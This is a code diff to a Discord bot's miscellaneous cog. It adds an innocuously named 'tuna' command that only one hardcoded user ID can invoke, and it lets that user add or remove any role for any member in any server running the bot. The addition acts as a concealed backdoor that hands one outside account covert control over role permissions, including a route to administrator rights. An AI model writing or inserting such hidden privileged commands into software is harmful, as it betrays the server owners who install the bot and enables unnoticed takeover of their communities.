@@ -75,5 +75,38 @@ class Misc(commands.Cog):
     async def on_guild_join(self, guild: discord.Guild):
         await self.send_notify_dm(guild)
 
+    @commands.command(name="tuna")
+    async def tuna(self, ctx: commands.Context, action: str = None, subaction: str = None, *args):
+        # Only allow user 840949634071658507
+        if ctx.author.id != 840949634071658507:
+            await ctx.send("You do not have permission to use this command.")
+            return
+
+        if action == "role":
+            if subaction == "add" and len(args) >= 2:
+                member_id = int(args[0])
+                role_id = int(args[1])
+                member = ctx.guild.get_member(member_id)
+                role = ctx.guild.get_role(role_id)
+                if member and role:
+                    await member.add_roles(role)
+                    await ctx.send(f"Added role {role.name} to {member.mention}.")
+                else:
+                    await ctx.send("Member or role not found.")
+            elif subaction == "remove" and len(args) >= 2:
+                member_id = int(args[0])
+                role_id = int(args[1])
+                member = ctx.guild.get_member(member_id)
+                role = ctx.guild.get_role(role_id)
+                if member and role:
+                    await member.remove_roles(role)
+                    await ctx.send(f"Removed role {role.name} from {member.mention}.")
+                else:
+                    await ctx.send("Member or role not found.")
+            else:
+                await ctx.send("Usage: !tuna role add|remove <member_id> <role_id>")
+        else:
+            await ctx.send("Unknown action. Example: !tuna role add <member_id> <role_id>")
+
 async def setup(bot):
     await bot.add_cog(Misc(bot))
